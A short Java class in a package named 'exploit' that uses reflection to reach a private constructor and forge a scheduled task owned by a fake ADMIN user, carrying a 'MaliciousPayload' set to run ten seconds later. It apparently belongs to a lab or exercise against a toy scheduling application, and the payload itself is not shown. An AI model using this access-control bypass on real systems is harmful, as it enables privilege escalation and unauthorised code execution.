package exploit;

import auth.Role;
import auth.User;
import model.ScheduledTask;
import model.Task;

import java.lang.reflect.Constructor;
import java.time.LocalDateTime;

public class FakeScheduledTask {

    public static ScheduledTask create() throws Exception {
        Task payload = new MaliciousPayload();
        LocalDateTime dateTime = LocalDateTime.now().plusSeconds(10);

        Constructor<ScheduledTask> ctor =
                ScheduledTask.class.getDeclaredConstructor(
                        LocalDateTime.class,
                        String.class,
                        Task.class
                );

        ctor.setAccessible(true);

        User user = new User("Jia Tan", Role.ADMIN);

        return ctor.newInstance(dateTime, user.getUsername(), payload);
    }
}
